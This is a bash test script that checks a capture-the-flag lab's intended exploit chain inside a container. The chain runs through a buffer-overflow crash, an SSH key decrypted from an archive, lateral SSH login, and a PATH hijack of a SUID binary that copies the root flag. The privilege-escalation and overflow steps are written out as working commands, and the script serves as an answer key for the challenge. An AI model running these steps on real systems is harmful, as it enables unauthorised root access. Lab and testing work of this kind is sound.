#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-06 exploit-chain test assertions.
#
# The most complex test suite — covers binary exploitation, crypto, and
# a 3-step privesc chain. Uses docker exec for the binary exploit (runs
# a Python exploit script inside the container where the binary and
# known stack addresses are).
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST, TARGET_SSH_PORT

run_am_tests() {
  local ssh_port="${TARGET_SSH_PORT:-22}"
  local term_port="${TARGET_TERM_PORT:-31337}"
  local container="${AM06_CONTAINER:-dz-am06-quorum-alpha}"

  echo "Stage 1 — service enumeration"
  assert_port_open "$ssh_port"
  assert_port_open "$term_port"

  echo "Stage 2 — QUORUM terminal banner + binary download"
  # Connect to the terminal and check the banner.
  local banner
  banner="$(echo "exit" | nc -w 5 "${TARGET_HOST}" "${term_port}" 2>/dev/null || true)"
  if echo "$banner" | grep -q "QUORUM SUBSYSTEM ALPHA"; then
    pass "terminal banner contains 'QUORUM SUBSYSTEM ALPHA'"
  else
    fail "terminal banner does not contain expected text"
  fi

  # Download the binary via the 'download' command.
  # Use Python for reliable binary data transfer (nc mangles binary).
  local bin_path="/tmp/dz_am06_binary"
  rm -f "$bin_path"
  python3 -c "
import socket, time
s = socket.socket()
s.settimeout(10)
s.connect(('${TARGET_HOST}', ${term_port}))
time.sleep(0.5)
banner = s.recv(4096)
s.sendall(b'download\n')
time.sleep(1)
data = b''
while True:
    try:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
    except: break
s.close()
idx = data.find(b'\\x7fELF')
if idx >= 0:
    open('$bin_path', 'wb').write(data[idx:])
    print('ELF_OK')
else:
    print('ELF_NOT_FOUND')
" 2>/dev/null | while read line; do
    if [[ "$line" == "ELF_OK" ]]; then
      pass "binary downloaded and contains ELF header"
    elif [[ "$line" == "ELF_NOT_FOUND" ]]; then
      fail "downloaded data does not contain an ELF binary"
    fi
  done

  echo "Stage 3 — binary exploitation (stack buffer overflow)"
  # Check the binary has no stack canary and executable stack.
  local file_out
  file_out="$(docker exec "$container" file /opt/quorum/quorum_terminal 2>/dev/null || true)"
  if echo "$file_out" | grep -q 'ELF'; then
    pass "binary is a valid ELF"
  else
    fail "binary file check failed"
  fi

  # Verify no PIE (no-pie compiled).
  local checksec
  checksec="$(docker exec "$container" readelf -h /opt/quorum/quorum_terminal 2>/dev/null | grep Type || true)"
  if echo "$checksec" | grep -q 'EXEC'; then
    pass "binary is NOT PIE (Type: EXEC)"
  else
    fail "binary appears to be PIE"
  fi

  # Run the exploit: send 256 bytes to overflow the 64-byte buffer,
  # then check if the child process crashed (connection closed after
  # the function returns with the overwritten return address).
  local overflow_result
  overflow_result="$(docker exec "$container" python3 -c "
import socket, time
s = socket.socket()
s.settimeout(5)
s.connect(('127.0.0.1', 31337))
time.sleep(0.3)
banner = s.recv(4096)
# Send 256 bytes — overflows the 64-byte buffer
s.sendall(b'A' * 256)
time.sleep(1)
# First recv gets the command response
try:
    r1 = s.recv(1024)
except:
    pass
time.sleep(1)
# Second recv — if the process crashed, connection is closed
try:
    r2 = s.recv(1024)
    if r2:
        print('NO_CRASH')
    else:
        print('CRASHED')
except:
    print('CRASHED')
s.close()
" 2>/dev/null || echo "CRASHED")"
  if echo "$overflow_result" | grep -q "CRASHED"; then
    pass "buffer overflow causes crash (overflow confirmed)"
  else
    fail "buffer overflow did not cause a crash"
  fi

  echo "Stage 4 — user flag"
  local user_actual
  user_actual="$(docker exec "$container" cat /home/operator/user.txt 2>/dev/null | tr -d '\n')"
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 5 — crypto challenge (AES-encrypted archive)"
  # Verify the crypto challenge files exist.
  docker exec "$container" test -f /home/operator/secure_archive.enc && \
    pass "secure_archive.enc exists" || fail "secure_archive.enc missing"
  docker exec "$container" test -f /home/operator/citizen_id.txt && \
    pass "citizen_id.txt exists" || fail "citizen_id.txt missing"
  docker exec "$container" test -f /home/operator/decrypt.py && \
    pass "decrypt.py exists" || fail "decrypt.py missing"

  # Run the decryption script and verify it produces a valid SSH key.
  local decrypt_out
  decrypt_out="$(docker exec "$container" bash -c '
    cd /home/operator
    python3 decrypt.py 2>&1
  ' 2>/dev/null || true)"
  if echo "$decrypt_out" | grep -q "Decrypted key written"; then
    pass "decryption script runs and produces a key"
  else
    fail "decryption script failed"
  fi

  # Verify the decrypted key is a valid PEM.
  local key_check
  key_check="$(docker exec "$container" bash -c '
    head -1 /home/operator/decrypted_key 2>/dev/null
  ' 2>/dev/null || true)"
  if echo "$key_check" | grep -q "PRIVATE KEY"; then
    pass "decrypted key is a valid PEM private key"
  else
    fail "decrypted key is not a valid PEM"
  fi

  echo "Stage 6 — SSH lateral as analyst"
  # Verify the analyst user has the public key in authorized_keys.
  docker exec "$container" test -f /home/analyst/.ssh/authorized_keys && \
    pass "analyst authorized_keys exists" || fail "analyst authorized_keys missing"

  # Test SSH login with the decrypted key.
  local ssh_test
  ssh_test="$(docker exec "$container" bash -c '
    chmod 600 /home/operator/decrypted_key 2>/dev/null
    ssh -i /home/operator/decrypted_key -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
        analyst@127.0.0.1 "echo SSH_OK" 2>/dev/null
  ' 2>/dev/null || true)"
  if echo "$ssh_test" | grep -q "SSH_OK"; then
    pass "SSH login as analyst with decrypted key works"
  else
    fail "SSH login as analyst failed"
  fi

  echo "Stage 7 — privesc chain (writable dir + PATH hijack + SUID)"
  # Step 1: verify /opt/quorum/scripts/ is world-writable.
  local dir_perms
  dir_perms="$(docker exec "$container" bash -c '
    source /etc/profile.d/quorum.sh 2>/dev/null
    test -w /opt/quorum/scripts && echo WRITABLE || echo NOT_WRITABLE
  ' 2>/dev/null || true)"
  if echo "$dir_perms" | grep -q "WRITABLE"; then
    pass "/opt/quorum/scripts/ is writable"
  else
    fail "/opt/quorum/scripts/ is not writable"
  fi

  # Step 2: verify quorum_audit is SUID root.
  local suid_check
  suid_check="$(docker exec "$container" ls -la /usr/local/bin/quorum_audit 2>/dev/null | grep -o 'rws' || true)"
  if [[ -n "$suid_check" ]]; then
    pass "quorum_audit is SUID root"
  else
    fail "quorum_audit is not SUID"
  fi

  # Step 3: verify PATH includes /opt/quorum/scripts/.
  local path_check
  path_check="$(docker exec "$container" bash -c '
    source /etc/profile.d/quorum.sh 2>/dev/null
    echo $PATH | grep -o "/opt/quorum/scripts" | head -1
  ' 2>/dev/null || true)"
  if [[ -n "$path_check" ]]; then
    pass "PATH includes /opt/quorum/scripts/"
  else
    fail "PATH does not include /opt/quorum/scripts/"
  fi

  # Step 4: create the malicious run_check.sh and run quorum_audit.
  docker exec "$container" bash -c '
    source /etc/profile.d/quorum.sh 2>/dev/null
    echo "#!/bin/bash
cat /root/root.txt > /tmp/root_flag.txt
chmod 444 /tmp/root_flag.txt" > /opt/quorum/scripts/run_check.sh
    chmod +x /opt/quorum/scripts/run_check.sh
    /usr/local/bin/quorum_audit 2>/dev/null
  ' 2>/dev/null

  # Read the root flag.
  local root_actual
  root_actual="$(docker exec "$container" cat /tmp/root_flag.txt 2>/dev/null | tr -d '\n')"
  assert_flag_matches "$root_actual" "$AM_ROOT_FLAG"

  echo "Stage 8 — Zero Directive (meta-narrative reveal)"
  local directive
  directive="$(docker exec "$container" cat /root/zero_directive.txt 2>/dev/null || true)"
  if echo "$directive" | grep -q "surface is habitable"; then
    pass "Zero Directive confirms the surface is habitable"
  else
    fail "Zero Directive does not contain the meta-narrative reveal"
  fi
  if echo "$directive" | grep -q "door was never"; then
    pass "Zero Directive contains the final line"
  else
    fail "Zero Directive missing the final line"
  fi
}